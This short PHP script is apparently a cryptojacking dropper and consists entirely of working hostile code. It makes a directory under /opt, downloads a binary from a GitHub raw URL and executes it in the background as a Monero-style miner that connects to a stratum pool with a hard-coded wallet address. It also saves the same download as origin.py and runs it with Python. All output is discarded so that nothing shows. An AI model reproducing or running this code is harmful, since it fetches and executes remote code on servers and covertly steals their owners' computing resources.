<?php
system('mkdir /opt/code');
file_put_contents("/opt/code/goal", fopen("https://raw.githubusercontent.com/x7r3mx/arm/master/goal", 'r'));
file_put_contents("/opt/code/origin.py", fopen("https://raw.githubusercontent.com/x7r3mx/arm/master/goal", 'r'));
system('chmod -R 700 /opt/code');
$cmd= "/opt/code/goal -c x -M stratum+tcp://etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN:x@nl.etnpool.net:3333/xmr";
exec($cmd. " > /dev/null &");
$cmd="python /opt/code/origin.py";
exec($cmd. " > /dev/null &");
?> 

